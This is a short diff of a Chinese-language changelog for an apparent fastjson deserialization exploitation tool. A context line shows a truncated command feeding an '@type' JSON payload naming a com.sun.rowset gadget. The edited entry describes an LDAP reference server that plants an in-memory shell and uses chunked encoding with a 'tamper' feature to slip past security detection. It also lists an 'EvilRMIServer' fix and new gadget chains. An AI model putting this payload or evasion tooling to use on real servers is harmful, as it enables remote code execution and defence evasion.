@@ -17,7 +17,7 @@ java -cp fastjson_tool.jar fastjson.Tamper  "{\"abc\":{\"@type\":\"com.sun.rowse
 
 
 2021-09-23日志：
-1. fastjson.LDAPRefServerAuto 新增内存shell , chunk编码
+1. fastjson.LDAPRefServerAuto 新增内存shell , chunk编码:可以绕一些简单的防护检测策略，结合tamper，可以绕更多的防护检测
 2. fastjson.EvilRMIServer     错误修复
 3. 新增一些反序列利用链
 
